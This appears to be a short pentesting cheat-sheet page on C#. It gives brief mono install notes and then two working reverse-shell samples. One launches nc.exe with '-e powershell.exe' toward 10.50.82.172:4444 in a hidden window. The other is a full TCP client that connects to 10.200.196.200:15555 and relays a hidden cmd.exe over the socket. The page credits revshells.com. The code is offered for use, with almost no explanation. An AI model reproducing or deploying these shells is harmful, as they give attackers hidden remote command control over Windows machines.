---
title: C#
description: C# examples.
---

# C#

## Installation

On Linux you can install `mono` which is a .NET compiler and runtime.

Arch : `sudo pacman -S mono`

On Windows you can directly use `Visual Studio` IDE.

## Examples

Compilation :

```bash
$ vim Main.cs
$ mcs Main.cs
$ file Main.exe
Main.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

### Shell commands

```c#
using System;
using System.Diagnostics;

namespace Example {
	class Program {
		static void Main() {
			Process proc = new Process();
			ProcessStartInfo procInfo = new ProcessStartInfo(
				"c:\\Windows\\Temp\\nc.exe", 
				"-e powershell.exe 10.50.82.172 4444"
			);
			procInfo.CreateNoWindow = true;
			proc.StartInfo = procInfo;
			proc.Start();
		}
	}
}
```

### Reverse shells

```c#
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient("10.200.196.200", 15555))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);
						
						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

Source [www.revshells.com](https://www.revshells.com/).
